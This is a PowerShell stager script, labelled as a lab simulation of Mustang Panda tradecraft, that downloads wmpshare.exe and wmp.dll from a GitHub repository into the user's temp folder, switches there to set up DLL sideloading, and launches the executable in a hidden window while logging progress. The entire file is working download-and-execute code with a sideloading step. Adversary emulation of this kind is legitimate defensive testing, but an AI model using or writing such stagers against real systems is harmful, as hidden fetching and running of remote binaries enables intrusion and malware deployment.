# download.ps1 - Lab Simulation Only
# Downloaded from GitHub and executed in-memory
# Then downloads wmpshare.exe + wmp.dll from GitHub to %TEMP%

param(
    [string]$ExeUrl = "https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/refs/heads/main/wmpshare.exe",
    [string]$DllUrl = "https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/refs/heads/main/wmp.dll"
)

$tempPath = $env:TEMP
$exePath = Join-Path $tempPath "wmpshare.exe"
$dllPath = Join-Path $tempPath "wmp.dll"
$logPath = Join-Path $tempPath "payload_log.txt"

function Write-Log { 
    param([string]$msg) 
    try { Add-Content -Path $logPath -Value "$(Get-Date -Format 'HH:mm:ss') - $msg" -ErrorAction SilentlyContinue } catch {}
}

Write-Log "=== Starting Payload Download ==="
Write-Log "Script executed from GitHub (in-memory)"
Write-Log "Temp Directory: $tempPath"

try {
    # Download wmpshare.exe
    Write-Log "Downloading wmpshare.exe from GitHub..."
    Invoke-WebRequest -Uri $ExeUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
    Write-Log "wmpshare.exe saved to: $exePath"

    # Download wmp.dll
    Write-Log "Downloading wmp.dll from GitHub..."
    Invoke-WebRequest -Uri $DllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
    Write-Log "wmp.dll saved to: $dllPath"

    # Verify files exist
    if ((Test-Path $exePath) -and (Test-Path $dllPath)) {
        Write-Log "Both files present. Preparing execution..."

        # Change to temp directory for DLL sideloading
        Set-Location $tempPath

        # Execute wmpshare.exe (hidden window)
        Write-Log "Executing: $exePath"
        $proc = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru

        if ($proc) {
            Write-Log "Process started (PID: $($proc.Id))"
        } else {
            Write-Log "Failed to start process"
        }
    } else {
        Write-Log "One or both files failed to save"
    }
}
catch {
    Write-Log "ERROR: $($_.Exception.Message)"
    Write-Log "StackTrace: $($_.ScriptStackTrace)"
}

Write-Log "=== Completed ===`n"
 